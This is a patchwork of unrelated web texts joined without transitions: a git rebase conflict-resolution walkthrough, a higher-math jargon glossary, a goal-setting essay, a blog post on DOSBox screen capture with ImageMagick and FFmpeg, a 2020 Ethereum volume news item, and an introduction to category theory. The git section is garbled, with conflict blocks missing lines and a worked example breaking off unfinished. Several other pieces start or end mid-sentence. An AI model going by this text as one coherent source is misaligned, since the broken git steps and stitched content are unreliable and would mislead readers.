<p>Suppose I have a patch that removes the call of <code>foo2</code> and another patch that removes the call of <code>foo3</code>, that is</p>
<div id="cb16"><pre><code><span id="cb16-1">def main():</span>
<span id="cb16-2">     foo1()</span>
<span id="cb16-3"><span>-    foo2()</span></span>
<span id="cb16-4">     foo3()</span></code></pre></div>
<p>and</p>
<div id="cb17"><pre><code><span id="cb17-1"> def main():</span>
<span id="cb17-2">     foo1()</span>
<span id="cb17-3">     foo2()</span>
<span id="cb17-4"><span>-    foo3()</span></span></code></pre></div>
<p>If I try to rebase the latter onto the former the conflict is</p>
<div id="cb18"><pre><code><span id="cb18-1">      foo1()</span>
<span id="cb18-2"><span>++&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD</span></span>

<span id="cb18-8"><span>++    foo2()</span></span>
<span id="cb18-9"><span>++&gt;&gt;&gt;&gt;&gt;&gt;&gt; Remove foo3</span></span></code></pre></div>
<h3 id="the-intent-of-the-rebased-commit-1">The intent of the rebased commit</h3>
<p>By looking at the difference between the middle hunk section and the bottom hunk section, or by looking at <code>git show REBASE_HEAD</code>—which shows</p>
<div id="cb19"><pre><code><span id="cb19-1"> def main():</span>
<span id="cb19-2">     foo1()</span>
<span id="cb19-3">     foo2()</span>
<span id="cb19-4"><span>-    foo3()</span></span></code></pre></div>
<p>—we can see that the intent of the rebased patch was to remove <code>foo3()</code>.</p>
<h3 id="the-state-of-the-base-branch-1">The state of the base branch</h3>
<p>On the other hand, the hunk section under <code>HEAD</code>, and <code>git show HEAD:&lt;filename&gt;</code>—which is</p>
<pre><code>def main():
    foo1()
    foo3()</code></pre>
<p>—show that the base branch does not contain <code>foo2()</code>, but <code>foo3()</code> is still there, ripe for removal. We need to apply the logical intent of the rebased patch to this context, which is done by removing the appearance of <code>foo3()</code> in the hunk section below <code>HEAD</code></p>
<div id="cb21"><pre><code><span id="cb21-1">      foo1()</span>
<span id="cb21-2"><span>++&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD</span></span>

<span id="cb21-8"><span>++&gt;&gt;&gt;&gt;&gt;&gt;&gt; Remove foo3</span></span></code></pre></div>
<p>and then we delete the middle and bottom hunk sections and the conflict markers to get</p>
<pre><code>def main():
    foo1()</code></pre>
<h2 id="worked-example-one-addition-one-removal">Worked example: one addition, one removal</h2>
<p>If I rebase the addition of <code>foo4()</code> on the removal of <code>foo3()</code> the conflict is</p>
<pre><code>  def main():

      foo2()

<p><code>git show REBASE_HEAD</code> shows</p>
<pre><code>     foo1()
     foo2()
     foo3()
+    foo4()</code></pre>
<p>so the intention of the rebased commit is to add <code>foo4()</code>. Doing this in the top hunk section (i.e.&nbsp;below <code>HEAD</code>) leads to</p>

As a result, it is equipped with a system of specialized <strong><a aria-label="symbols (opens in a new tab)" href="https://mathvault.ca/hub/higher-math/math-symbols/" target="_blank" rel="noreferrer noopener">symbols</a></strong> and <strong>vocabularies</strong> — each with its own level of generality and formality.</p><p>Among these, there’s a particular subset of terms that is uniquely foundational and appropriate to our pursuit: the <strong>higher mathematical jargon</strong>. Loosely speaking, these are a set of specialized terms that fall into most — if not all — of the following categories:</p><ul><li>Specific to <strong>higher mathematics</strong></li><li><strong>English-looking</strong> (with a near-technical meaning)</li><li><strong>Frequently-occurring</strong></li><li><strong>Cross-disciplinary</strong> (i.e., not field-specific)</li></ul><p>In brief, these are terms that are generally accessible to most, yet still provide us with a glimpse of the world of non-miniaturized mathematics — and the way their practitioners act and think. In fact, in what follows, we’ve compiled a list of 106 such terms — along with some in-depth exploration of their <strong>definitions</strong>, <strong>examples</strong>, <strong>relevance</strong> and <strong>implications</strong>.</p><p>So if you’re ready to dive into this fascinating world that is known as mathematics, then let’s get started!</p><p>(and if you’re looking for a concise rendition of all the 106 terms featured in this glossary, then you might find the following <strong>higher math jargon mindmap</strong> both interesting and useful.)</p><span></span><figure><img loading="lazy" src="https://mathvault.ca/wp-content/uploads/Math-Glossary-Header-Image.png" alt="The Definitive Glossary of Higher Mathematical Jargons" width="1366" height="702" title="Math Glossary Header Image"></figure><h2 id="toc">Higher Mathematical Jargon — The Definitive List (106 Terms)</h2><p><span> The definitive glossary of higher mathematical jargon — from abstract nonsense, elementary proof to singularity and 101+ more. </span> <span><span>Click to Tweet</span><i></i></span></p><h2 id="abstraction"><a href="#toc">Abstraction</a></h2><p>The process of extracting the underlying <strong>structures</strong>, <strong>patterns</strong>, or <strong>properties</strong> of some mathematical objects, with the intention of generalizing these findings to a broader class of objects. These include, for example:</p><ul><li>Finding the <strong>shared properties</strong> of similar polynomials</li><li>Formalizing the <strong>general pattern</strong> of a sequence</li><li>Establishing a <a href="#otoc"><strong>one-to-one correspondence</strong></a> between two sets</li><li>Constructing an alternate <a href="#axiom"><strong>axiomatic system</strong></a> for Euclidean geometry</li></ul><p>At first, abstraction can seem a bit unappealing due to its higher cognitive demand and lack of connection to real-world phenomena. However, it can often turn out to be an integral force in bringing about a <strong>broaden applicability</strong> to a field — along with some <strong>unification</strong> in between the fields.</p><div><p>Did You Know?</p><p>While abstraction is involved in pretty much all subfields of mathematics, it is particularly well-represented in fields such as <strong>abstract algebra</strong>, <strong>model theory</strong>, <strong>axiomatic set theory</strong> and <a href="#nonsense"><strong>category theory</strong></a>.</p></div><h2 id="nonsense"><a href="#toc">Abstract Nonsense</a></h2><figure id="attachment_18333" aria-describedby="caption-attachment-18333"><img loading="lazy" src="https://mathvault.ca/wp-content/uploads/Category-Theory-Diagram.png" alt="Category Theory: A Category with Objects and Morphisms" width="325" height="325" title="Category Theory Diagram"><figcaption id="caption-attachment-18333">A category with objects $A$, $B$, $C$ and a series of morphisms.</figcaption></figure><p>A colloquial term for <strong><a href="https://en.wikipedia.org/wiki/Category_theory" target="_blank" rel="noopener noreferrer">category theory</a></strong> (a mathematical subject dedicated to the notion of category and the formalization of <a href="#structure">mathematical structures</a>), or the methods and arguments that are related to it.</p><p><span>Since different branches of mathematics deal with different mathematical structures satisfying the definition of a category, category theory can be regarded as a <strong>unifying theory</strong> of mathematics — whose results are applicable to a wide range of disciplines.</span></p><p>In particular, if a proposition follows from abstract nonsense, then it means that its argument has more to do with the underlying categorical structure of its objects — rather than the field where it’s found. And since such arguments are often highly abstract and long-winded by nature, they are also alternatively referred to as “<strong>general abstract nonsense</strong>” or “<strong>generalized abstract nonsense</strong>“.</p><h2 id="aon"><a href="#toc">Abuse of notation</a></h2><p>The act of inadvertently or deliberately using notations in a way that’s not entirely<strong> syntactically correct</strong> — but which simplifies the exposition and makes the passage easier to understand. For example, one might say that:</p><ul><li>“$\mathbb{R}$ is distributive” — rather than “$(\mathbb{R}, +, \times)$ is distributive.”</li><li>“$3$ is differentiable” — rather than “the function defined by the rule $x \mapsto 3$ for all real $x$, is differentiable.”</li><li>“$a+b+c = c+b+a$” — rather than “$(a+b) + c = (c+b) + a$”.</li></ul><p>In the cases where the context and the assumptions are made clear and well understood, abuses of notation are usually harmless (if not actually desirable). In other cases, however, the same might not be true, and can amount to a <strong>misuse of notation</strong> — which is a faux-pas in mathematics (such as the case of $\frac{\mathrm{d}y}{\mathrm{d}x}=\frac{y}{x}$).</p><h2 id="algo"><a href="#toc">Algorithm</a></h2><p>A finite series of <a href="#welldefined">well-defined</a>, <strong>computer-implementable instructions</strong> to solve a specific set of computable problems. It takes a finite amount of initial input(s), processes them unambiguously at each operation, before returning its outputs within a finite amount of time. Some examples of algorithm in mathematics include:</p><ul><li>The <strong>Euclidean algorithm</strong> (for finding the greatest common factor of two natural numbers)</li><li><a href="https://mathvault.ca/long-division">The <strong>long division algorithm</strong> (and its variants)</a></li><li>The <strong>simplex algorithm</strong> (for finding the optimal solution under a set of linear constraints)</li></ul><p>In essence, algorithms are created to streamline the solution-finding process for a specific set of problems, though it can also remove the necessity of thinking and understanding in the process. For a a series of instructions that are quasi-algorithmic and broader in nature, the term “<strong>general procedure</strong>” is sometimes used (which, like an algorithm, could also involve some element of <a href="#heuristics">heuristics</a> or <a href="#recursion">recursion</a>).</p><h2 id="almost"><a href="#toc">Almost</a></h2><figure id="attachment_18414" aria-describedby="caption-attachment-18414"><img loading="lazy" src="https://mathvault.ca/wp-content/uploads/Dart-and-Board.png" alt="Dart and Board" width="225" height="225" title="Dart and Board"><figcaption id="caption-attachment-18414">Since the actual circumference of the board has area 0, the probability of hitting it is also 0 as well (i.e., almost never).</figcaption></figure><p>A handy adverb similar to its usage in English, but can take on specific meanings depending on the context. For example:</p><ul><li>“<strong>Almost all</strong> elements in a set” usually means “all but a finite/countable amount of negligible elements in the set.”</li><li>“<strong>Almost no</strong> integer” usually means “only a finite subset of integers.”</li><li>“A property holds <strong>almost everywhere</strong> (in a measure space)” usually means “everywhere in a set except a subset of<a href="http://mathworld.wolfram.com/MeasureZero.html" target="_blank" rel="noopener noreferrer"> measure zero</a>.”</li><li>“An event occurs <strong>almost surely</strong>” usually means that “the event has a probability of 1, even though it does not include all of the possible outcomes.”</li><li>“An event occurs <strong>almost never</strong>” usually means that “the event has a probability of 0, even though it does contain some of the possible outcomes.”</li></ul><p>Here, notice that “almost” doesn’t necessarily mean that the <strong>exceptional cases</strong> are “small”, and hence one is perfectly well-justified in making claims such as “almost all real numbers are transcendental” — or that “the dart almost never lands on the circumference of the board.”</p><h2 id="ansatz"><a href="#toc">Ansatz</a></h2><p>A term of German origin meaning “initial placement of a tool at a work piece” (<a href="https://en.wikipedia.org/wiki/Ansatz" target="_blank" rel="noopener noreferrer">Wikipedia</a>), and is used in mathematics to refer to the initial, additional <strong>mathematical assumptions</strong> made to kick start the problem solving process — but which are later confirmed to be parts of the actual solution as well. Some examples of ansatz in mathematics include:</p><ul><li>The adoption of linear regression model to fit the data points (i.e., <strong>linear ansatz</strong>)</li><li>The assumption that the solutions to a differential/recurrent equation take an exponential form (<strong>exponential ansatz</strong>)</li><li>The assumption that the solution to a system of linear equations is expressible in terms of a particular vector (<strong>ansatz of particular solution</strong>).</li></ul><p>Metaphorically speaking, the use of ansatz can be liken to drawing a picture by first establishing a <strong>framework</strong>, in that if it succeeds, then the framework can be reused as an ansatz later on, but if it doesn’t, then it’s usually discarded and marked as an instance of failure.</p><h2 id="arbitrarily"><a href="#toc">Arbitrarily</a></h2><p>An adverb attached to a mathematical adjective X to make clear that something is “<strong>X with little limitation or restraint</strong>.” For example:</p><ul><li>An <strong>arbitrarily large</strong> function is a function capable of assuming values larger than any fixed choice of real number — regardless of the size of the latter.</li><li>An <strong>arbitrarily small</strong> positive sequence is a sequence capable of assuming values smaller than any fixed choice of positive real number — regardless of the “tininess” of the latter.</li><li>An <strong>arbitrarily long</strong> progression is a progression whose number of members can be made to exceed than any choice of natural number — regardless the size of the latter.</li></ul><p>In general, “arbitrarily” is a foundational term in number theory and mathematical analysis, and can also occur in other topics where some form of <strong>degree</strong> and <strong>ordering</strong> are involved (e.g., <a href="https://en.wikipedia.org/wiki/Polynomial_ring" target="_blank" rel="noopener noreferrer">polynomial ring</a>).</p><div><p>Caution</p><p>Don’t make the mistake in assuming that “arbitrarily” means “infinitely”! If anything, “arbitrarily” usually carries a sense of being “without bound within the finite realm.”</p></div><h2 id="arbitrary"><a href="#toc">Arbitrary</a></h2><p>An adjective used to refer to a choice made without any specific criterion or restraint (e.g., arbitrary integer, arbitrary division of a set, arbitrary permutation of a sequence).

<p>Best-selling author Jim Collins famously coined the phrase “big, hairy, audacious goals.” Goals of this type are bold, important, and unexpected. They channel our vision; inspiring change in us and the people we serve.</p>



<p>For example: instead of saying “I’m going to learn a new recipe,” a big, hairy, audacious goal would be “I’m going to write an award-winning book on bread making.” Rather than committing to put aside 5% of your paycheck, you might drastically change your life hoping to become a millionaire in 10 years.</p>



<p>Big, hairy, audacious goals are fantastic–if you can deliver on them. And that is the problem. Anyone can come up with bluster.&nbsp;(If you can’t, there’s a sea of sales pitches with your name on them). But we’re all so sick of big, hairy, audacious, <em>unfulfilled</em> goals in New Year’s Resolutions, corporate propaganda, and marketing copy that we’ve all developed at least a little pessimism about goal setting.</p>



<p>Failure doesn’t inspire confidence. Period. We can learn from it. We can develop grace in loss. We can be better because of our humility. But an engine that misfires in most of its cylinders isn’t going to take us anywhere.</p>



<p>So instead of setting big goals, start tiny–much smaller than you have before. Choose goals that are actually feasible. Don’t worry that they may not move the needle right now. Small changes add up quickly.</p>



<p>You don’t need to scale hairy cliffs when smooth paths are an option. Going around the mountain may be better than going through it. And if you aren’t moving at all, the difficulty of your journey may prevent you from starting. Hard journeys will need to be done; build your strength now by starting somewhere.</p>



<p>Audacity alone may not be a problem–we all want to be bold in our convictions, and unexpected changes often inspire us. But there is little value in choosing surprising goals just because they sound great. Embrace goals that are critical: the ones you must keep to survive. As you develop confidence, you can level up until you’re working on satisfaction, fulfillment, and dreams. Be patient. Treat yourself when you can. But when your car is out of gas on the highway, don’t waste your time rewiring the stereo.</p>



<p>Goals matter. And there is a place for big, hairy, audacious goals. But the things that will actually change your life are almost always tiny, smooth, critical goals. Start there.</p>

<h2 id="vintage-dos-programs"><a href="#vintage-dos-programs">Vintage DOS Programs</a></h2>

<p>
Once in a while, I fire up one of the vintage DOS games or language
interpreters in DOSBox for nostalgia's sake. I have archived these
vintage programs at <a href="https://github.com/susam/dosage">github.com/susam/dosage</a>.
DOSBox is an emulator program that emulates IBM PC compatible computers
running DOS. Trying my hands on these antiquated DOS programs now evokes
old memories from my childhood days days when I first came across
computers as part of our primary school curriculum.
</p>

<p>
Computers were much simpler in those days. The ones in our school were
IBM PC compatible computers with mostly monochrome displays. A couple of
them had support for a very limited number of colours provided by CGA or
EGA graphics cards. The ability to boot a computer using a
5¼-inch floppy disk containing MS-DOS, load a Logo or BASIC
interpreter, or a computer game from another floppy disk, and then write
some programs or play a few games without any distraction had its own
charm that I find missing from modern day computing.
</p>

<p>
Often while using old DOS programs with DOSBox in this day and age, I
want to take screenshot captures or video captures of the DOSBox
sessions and share them with my friends. In this article, I will explain
how I create good quality screenshot captures and video captures of
DOSBox sessions in formats that I can share with others.

<h2 id="software-versions"><a href="#software-versions">Software Versions</a></h2>

<p>
Since this article involves several pieces of software, some of what is
written here may not hold good in future if the behaviour of any of
these software tools change in future. The list below contains the
versions of all software tools that were used to test the commands
provided in this article:
</p>

<ol>
  <li>macOS High Sierra 10.13.6</li>
  <li>DOSBox 0.74-3</li>
  <li>FFmpeg 4.3.1</li>
  <li>ImageMagick 7.0.10-28
  </li><li>IBM Personal Computer Logo Version 1.00</li>
  <li>Digger (Original PC booter version by Windmill Software)</li>
</ol>

<p>
Note that both Logo and Digger programs in the list above are DOS
programs that were released in 1983. They cannot be run directly on
modern computers but they can be run with DOSBox since it emulates old
IBM PC compatible computers.
</p>


<h2 id="ibm-pc-logo-in-dosbox"><a href="#ibm-pc-logo-in-dosbox">IBM PC Logo in DOSBox</a></h2>

<p>
IBM Personal Computer Logo developed by Logo Computer Systems Inc.
(LCSI) in 1983 was the first piece of software I got introduced to while
learning computers as a kid. I came across it at the age of 8 when I was
in Class 4 and our school had a 5¼-inch floppy disk with IBM PC
Logo on it. As a result, Logo was the first programming language I
learnt in my life. About 20 years later, I would realize that the first
programming language I learnt is a dialect of Lisp. How wonderful!

<p>
If the Logo interpreter program <code>LOGO.COM</code> exists in the
current directory, it can be run with DOSBox using the following
command:
</p>

<pre><code>dosbox LOGO.COM</code></pre>

<p>
One of the things I enjoyed drawing with Logo was a grid of overlapping
circles like this:
</p>

</figure>

<p>
Here is the Logo source code for the above output:
</p>

<pre><code>REPEAT 20 [REPEAT 180 [FD 1 RT 2] RT 18]</code>
</pre>


<h2 id="digger-in-dosbox"><a href="#digger-in-dosbox">Digger in DOSBox</a></h2>

<p>
At around the same time I learnt Logo, I also came across Digger, a
computer game for IBM PC developed by Windmill Software in 1983.
</p>

<figure id="digger-welcome-screenshot">
  <a href="https://susam.in/files/blog/dosbox-digger-0.png"><img src="https://susam.in/files/blog/dosbox-digger-0.png" alt="A screenshot of Digger welcome screen with the names and pictures of various game characters with a copyright notice of Windmill Software"></a>
  <figcaption>

  </figcaption>
</figure>

<p>
If the Digger program <code>DIGGER.COM</code> exists in the directory,
it can be run using DOSBox with the following command:
</p>

<pre><code>dosbox DIGGER.COM -c "config -set cpu cycles=500" -machine cga</code>
</pre>

<p>
The <code>-machine cga</code> option emulates a machine with Color
Graphics Adapter (CGA) because Digger requires a machine of this type to
run correctly. The <code>cycles=500</code> configuration option slows
down the speed at which DOSBox emulates instructions in order to emulate
the slow machines of olden days. Without this option, Digger runs too
fast to be able to be conveniently playable.
</p>

  <figcaption>

</figure>

<p>
Digger has an excellent gameplay where the player digs through
underground tunnels to pick up emeralds, drop gold bags to release the
gold or squash nobbins and hobbins, collect the released gold to earn
more points, and so on. It uses bright and attractive colours. The music
is great. When Digger was released in 1983, it was quite advanced for
its time.
</p>



<h2 id="dosbox-screenshot-capture"><a href="#dosbox-screenshot-capture">DOSBox Screenshot Capture</a></h2>

<p>
The screenshots above were obtained by running IBM PC Logo and the
original 1983 PC booter version of Digger on DOSBox and then resizing
the screenshots such that their aspect ratio matches the aspect ratio of
old CRT computer monitors.
</p>

<p>
To obtain the screenshots, we first press <kbd>Ctrl</kbd> +
<kbd>F5</kbd> while DOSBox is running. The paths of the screenshots
appear in the console output at the terminal where DOSBox was launched.
For example:
</p>

<pre><samp>Capturing Screenshot to /Users/susam/Library/Preferences/capture/logo_000.png
Capturing Screenshot to /Users/susam/Library/Preferences/capture/logo_001.png</samp>
</pre>

<pre><samp>Capturing Screenshot to /Users/susam/Library/Preferences/capture/digger_000.png
Capturing Screenshot to /Users/susam/Library/Preferences/capture/digger_001.png</samp>
</pre>

<p>
The screenshots obtained in this manner have an aspect ratio of 8:5
which makes the output look stretched horizontally. The old CRT computer
monitors for which these old DOS programs were written had an aspect
ratio of 4:3 instead. This stretched look can be fixed by resizing the
images to an aspect ratio of 4:3. Here are the commands used to fix the
aspect ratio and produce the images:
</p>

<pre><code>convert logo_000.png -sample '1920x1440!' dosbox-logo-0.png
convert logo_001.png -sample '1920x1440!' dosbox-logo-1.png</code>
</pre>
<pre><code>convert digger_000.png -sample '1920x1440!' dosbox-digger-0.png
convert digger_001.png -sample '1920x1440!' dosbox-digger-1.png</code>
</pre>

<p>
The <code>convert</code> program comes with ImageMagick. There are a few
things worth noting here:
</p>

<ul>
  <li>
    We use the <code>-sample</code> option here to resize the image as
    opposed to using <code>-resize</code> or <code>-scale</code>. The
    <code>-resize</code> or <code>-scale</code> option would smooth the
    jagged edges in the text and graphics by introducing additional
    colours. The <code>-resize</code> option is great for real world
    images where we do want the edges to be smooth while scaling up or
    down but in these screenshots we want to retain the crisp and jagged
    edges that is typical of DOSBox and the old CRT monitors. Therefore
    we use the <code>-sample</code> option that does not introduce any
    new colours. Instead it uses nearest-neighbour interpolation (point
    sampling) to decide the colours of the scaled image.
  </li>
  <li>
    The <code>!</code> flag is used to ignore the aspect ratio of the
    original image. Without this flag, the output files would be
    1920x1200 in size, that is, the largest size with an aspect ratio of
    8:5 that fits in a 1920x1440 box. With this flag, the original
    aspect ratio of 8:5 is ignored and the output is exactly 1920x1440
    in size.
  </li>
</ul>

<h2 id="dosbox-video-capture"><a href="#dosbox-video-capture">DOSBox Video Capture</a></h2>

<p>
To start capturing video of DOSBox, we press <kbd>Ctrl</kbd> +
<kbd>Alt</kbd> + <kbd>F5</kbd>. The same key combination stops capturing
video. The following output appears in the console output to show where
the video file is saved:
</p>

<pre><samp>Capturing Video to /Users/susam/Library/Preferences/capture/logo_000.avi
Stopped capturing video.</samp>
</pre>

<p>
Say, I want to share a video capture of DOSBox with Logo running on it
with my friends who might be on devices that do not support playing AVI
files. The following FFmpeg command converts the video to a format that
can be distributed widely and played on a wide range of devices and
players:
</p>

<pre><code>ffmpeg -i logo_000.avi -an -c:v libx264 -preset veryslow \
       -crf 17 -vf format=yuv420p,scale=1920:1440:flags=neighbor,fps=30 \
       dosbox-logo.mp4</code>
</pre>

<p>
Here is what the output looks like:
</p>

<figure id="logo-video">
  <video controls="">
    <source src="https://susam.in/files/blog/dosbox-logo.mp4" type="video/mp4">

  <figcaption>
    Video capture of IBM Personal Computer Logo
    [<a href="https://susam.in/files/blog/dosbox-logo.mp4">MP4</a>]
  </figcaption>
</figure>

<p>
Let us briefly discuss the various FFmpeg options used here:
</p>

<ul>
  <li>
    <p>
      <code>-i logo_000.avi</code>
    </p>
    <p>
      This, of course, specifies the input file.
    </p>
  </li>
  <li>
    <p>
      <code>-an</code>
    </p>
    <p>
      The audio is silent in this video, so we reduce the file size a
      little by disabling the audio stream with this option. For
      example, without this option the output file size was 317 KB but
      with this option it turned out to be 282 KB.
    </p>
    <p>
      This option should not be specified if the audio stream needs to
      preserved, for example, with DOS games that have audio. We will
      see an example of this in the next section.
    </p>
  </li>
  <li>
    <p>
      <code>-c:v libx264</code>
    </p>
    <p>
      This option selects the x264 encoder to encode the video stream
      into H.264 format. H.264 is also known as MPEG-4 Part 10, Advanced
      Video Coding (MPEG-4 AVC). Currently, it is the most popular
      format for recording, compression, and distribution of video
      content.
    </p>
  </li>
  <li>
    <p>
      <code>-crf 17</code>
    </p>
    <p>
      This option provides visually lossless output, that is, high
      quality output without any loss in quality that can be perceived
      by human eyes. For completely lossless output, we need to use the
      <code>-crf 0</code> option. However, this option sets the video
      profile to <code>High 4:4:4 Predictive</code> which prevents the
      video from playing in some video players. This issue is discussed
      in more detail in the point about <code>yuv420p</code> pixel
      format that comes later in this list. Since <code>-crf 0</code>
      cannot be used due to this issue, the next best option is
      <code>-crf 1</code> which while not completely lossless is much
      better than …</p></li></ul></div></div>

<ul><li>Ethereum can reach to $1 Trillion transactions by the year end.</li><li>Bitcoin has 50% less transactional volume compared to Ethereum.</li></ul>



<p>The DeFi boom is setting new records and has been the talk of the show since its launch. The crypto market maintained its volatility, but the surge in DeFi kept increasing. This has led Ethereum to reach $1 trillion in volume transactions by the year.&nbsp;</p>



<figure><img src="https://lh3.googleusercontent.com/CtrOsljkHz9xabGpmYat-THEKwbGT2dcrhXtCtcxzuZAm-khYwhVm97lhab7ZpZmOlGKbgpQGXDKDrnf58Rf2YzU9TBjvvoq0a2kfCPit9reK7mGmpvlDZKAbfGLFb1cCPrgbXlR" alt=""><figcaption>Source: messari, coinmetrics</figcaption></figure>



<p>Ryan Watkins of Messari, a crypto research and news company, published a report that stated the market has peaked since the ICO boom of 2017. In his report, Ryan Watkins said that stablecoins and DeFi are the primary factors for the Ethereum increased volume transactions.</p>



<h2><strong>Ethereum versus Bitcoin&nbsp;</strong></h2>



<p>The report shows the comparison between the two most famous and debated cryptocurrencies; Bitcoin and Ethereum. It can be clearly seen that the ETH at present is transacting twice the volume of the BTC. Watkins commenting on the situation tweeted that when a product (DeFi) finds a market fit (Ethereum), the crypto-economy always booms.&nbsp;</p>



<figure><div>
<blockquote data-width="500" data-dnt="true"><div lang="en" dir="ltr"><p>🤯 Ethereum now transacts two times more value than Bitcoin daily.</p><p>This is what a cryptoeconomy looks like when it starts to find product-market fit.</p><p>1/ <a href="https://t.co/mjXJkZTddU">pic.twitter.com/mjXJkZTddU</a></p></div>— Ryan Watkins (@RyanWatkins_) <a href="https://twitter.com/RyanWatkins_/status/1318922143837659136?ref_src=twsrc%5Etfw">October 21, 2020</a></blockquote>
</div></figure>



<p>Not long back in August 2020, Chris Burniske of Placeholder, a venture capital partnership that invests in open blockchain networks in his tweet, predicted a similar scenario. In his tweet, he showed that if the $BTC will cross the $50,000 mark and $ETHBTC returns to former ATH, then a $1 trillion of transactional volume can be witnessed over either platform.&nbsp;</p>



<figure></figure>



<p>The past 30 days have witnessed Ethereum transacting volume of $7 billion while Bitcoin stands at less than $3 billion processing.&nbsp;</p>



<h3><strong>The Key Factors of Growth</strong></h3>



<p>It won’t be fair to comment that Ethereum grows large in volume on its own. When in reality, the DeFi boom, Stablecoin growth, the rise of the smart dollar, and completion of the stablecoin protocol, all of which occurred over the Ethereum network, were the reasons. The majority of Ethereum’s transactional volume is based on ERC-20 tokens. When <a href="https://twitter.com/RyanWatkins_/status/1318922153123844096">comparing </a>to the similar lines, Tether is transacting more volume than Bitcoin, but based on ERC-20 Tether.&nbsp;</p>



<p>Yield farming is pushing the demand-supply for growth percent greater than 600% for MakerDAO’s DAI stabelcoin. Decentralized Exchanges (DEXs) at <a href="https://twitter.com/RyanWatkins_/status/1318922157041307649">present </a>constitute 13.6% of total volumes from all exchanges, both centralized and decentralized. At the same time, Uniswap and Curve contributed more than $20 billion in the total volume for September.&nbsp;</p>



<h4><strong>Vitalik on the News</strong></h4>



<p>Vitalik Buterin, on the same, <a href="https://twitter.com/VitalikButerin/status/1318940081869131776">tweeted </a>that the times are changing, and Ethereum is no more just an altcoin. And people should stop seeing the crypto world only through the lens of Bitcoins and widen their perspective.</p>

</section><p>Early in our mathematical education, we learn about a strong interplay between algebra and geometry—algebraic equations give rise to graphs and geometric figures, and geometric features can be encoded in algebraic expressions. It’s almost as if there’s a portal or bridge connecting these two realms in the grand landscape of mathematics: whatever occurs on one side of the bridge is mirrored on the other.<span id="more-12565"></span></p>
<p><img loading="lazy" src="https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/bridge.jpg?resize=429%2C383" alt="" width="429" height="383" srcset="https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/bridge.jpg?resize=1024%2C915 1024w, https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/bridge.jpg?resize=300%2C268 300w, https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/bridge.jpg?resize=768%2C686 768w, https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/bridge.jpg?resize=1%2C1 1w, https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/bridge.jpg?w=1308 1308w, https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/bridge.jpg?w=1962 1962w" sizes="(max-width: 429px) 100vw, 429px" data-recalc-dims="1"></p>
<p>So although algebra and geometry are very different areas of mathematics, this connection suggests that they are intrinsically related. Incidentally, the `bridge’ that spans them is a but a dim foreshadow of much deeper connections that exist between other branches of mathematics that also may, a priori, seem unrelated: set theory, group theory, linear algebra, topology, graph theory, differential geometry, and more. And what’s amazing is that these relationships—these bridges—are more than just a neat observation. They are <em>mathematics</em>, and that mathematics has a name: <em>category theory</em>.</p>
<h2>What is a category?</h2>
<p>Martin Kuppe once created a wonderful map of the mathematical landscape (see facing page) in which category theory hovers high above the ground, providing a sweeping vista of the terrain. It enables us to see relationships between various fields that are otherwise imperceptible at ground level, attesting that seemingly unrelated areas of mathematics aren’t so different after all. This becomes extraordinarily useful when you want to solve a problem in one realm (topology, say) but don’t have the right tools at your disposal. By ferrying the problem to a different realm (such as group theory), you’re able to see the problem in a different light and perhaps discover new tools that may help the solution become much easier. In fact, this is precisely how category theory came to be. It was birthed in the 1940s in an attempt to answer a difficult topological question by recasting it in an easier, algebraic light.</p>
<p>Thinking back to the mathematical landscape, you’ll notice that each realm consists of some objects (set theory has sets, group theory has groups, topology has topological spaces…) that relate to each other (sets relate via functions, groups relate via homomorphisms, topological spaces relate via continuous functions…) in sensible ways (such as composition and associativity).</p>

<p>This common thread weaves throughout the landscape and unites the various fields. The mathematics of category theory formalises this unification. More concretely, a <em>category</em> is a collection of <em>objects</em> with relationships between them (called <em>morphisms</em>) that behave nicely in terms of <em>composition</em> and <em>associativity</em>. This provides a template for mathematics, and depending on what you feed into that template, you’ll recover one of the mathematical realms: the category of sets consists of sets and relationships (ie functions) between them; the category of groups consists of groups and relationships (ie group homomorphisms) between them; the category of topological spaces consists of topological spaces and relationships (ie continuous functions) between them; and so on.</p>

<p>The analogy between a category and a template is due to Barry Mazur from his wonderfully written, non-technical introduction to category theory, <a href="http://www.math.harvard.edu/~mazur/preprints/when_is_one.pdf" target="_blank" rel="noopener"><em>When is one thing equal to some other thing?</em></a> In it he writes, “This concept of category is an omni-purpose affair… There is hardly any species of mathematical object that doesn’t fit into this convenient, and often enlightening, template.” Indeed, as category theorist <a href="http://chalkdustmagazine.com/interviews/in-conversation-with-eugenia-cheng/" target="_blank" rel="noopener">Eugenia Cheng</a> so aptly put it in her treatise <a href="http://cheng.staff.shef.ac.uk/misc/4000.pdf" target="_blank" rel="noopener"><em>Higher-dimensional category theory</em></a>, “category theory is the mathematics of mathematics”.</p>
<h2>It’s all about relationships</h2>
<p><a href="https://i2.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/list.jpg"><img loading="lazy" src="https://i2.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/list.jpg?resize=498%2C401" alt="" width="498" height="401" srcset="https://i2.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/list.jpg?resize=1024%2C826 1024w, https://i2.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/list.jpg?resize=300%2C242 300w, https://i2.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/list.jpg?resize=768%2C619 768w, https://i2.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/list.jpg?resize=1%2C1 1w, https://i2.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/list.jpg?w=1048 1048w" sizes="(max-width: 498px) 100vw, 498px" data-recalc-dims="1"></a>One of the main features of category theory is that it strips away a lot of detail: it’s not really concerned with the individual elements in your set, or whether or not your group is solvable, or if your topological space has a countable basis. So you might be thinking, “Eh, category theory sounds so abstract. Can any good come from this?” Happily, the answer is yes! An advantage of ignoring details is that our attention is diverted away from the individual objects and turned towards the relationships—the morphisms—that exist between them. And as any category theorist will tell you, <em>relationships are everything.</em></p>
